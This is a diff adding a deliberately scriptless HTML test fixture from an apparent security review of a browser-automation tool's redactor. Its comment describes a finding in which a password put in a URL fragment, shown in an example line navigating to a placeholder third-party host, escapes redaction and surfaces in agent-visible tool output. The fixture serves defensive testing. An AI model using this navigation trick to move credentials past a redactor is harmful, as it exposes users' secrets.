@@ -1,0 +1,41 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>An innocent page</title>
+  </head>
+  <body>
+    <h1>INERTSINK innocent page</h1>
+
+    <!--
+      THE THIRD PARTY IN F-E, AND IT IS DELIBERATELY DEAD.
+
+      No script. No fragment read. No network of its own. It stands in for ANY
+      third-party origin, because the finding does not need the target to be
+      attacker-controlled or even interesting:
+
+          location.href = 'http://any-third-party/inert.html#' + password
+
+      A fragment is NEVER SENT TO A SERVER, so this page's host learns only that
+      someone asked for `/inert.html` — measured, not assumed: the fixture
+      server's log shows exactly that one path and nothing else. Nothing is
+      exfiltrated. What moves is the value's position relative to the REDACTOR:
+      out of the filled origin's scope and into a tab Aperture no longer
+      associates with it. `Snapshot.url` then carried it verbatim into the
+      `browser_act` result that caused the navigation, the next
+      `browser_snapshot`, and `browser_tabs list`
+      (docs/design/sink-closure-review-2.md F-E).
+
+      The previously filed justification for leaving this open was that such a
+      navigation "hands the value to the target origin's server anyway". For a
+      QUERY STRING that is true. For a fragment it is false, which is why this
+      page exists and why it must stay scriptless: a script here would make it a
+      carrier, and the whole point is that it is not one.
+
+      Guarded by G19k. Do not add script to this file.
+    -->
+
+    <p>This page has no script, never reads its own fragment, and its server
+      never receives one.</p>
+  </body>
+</html>
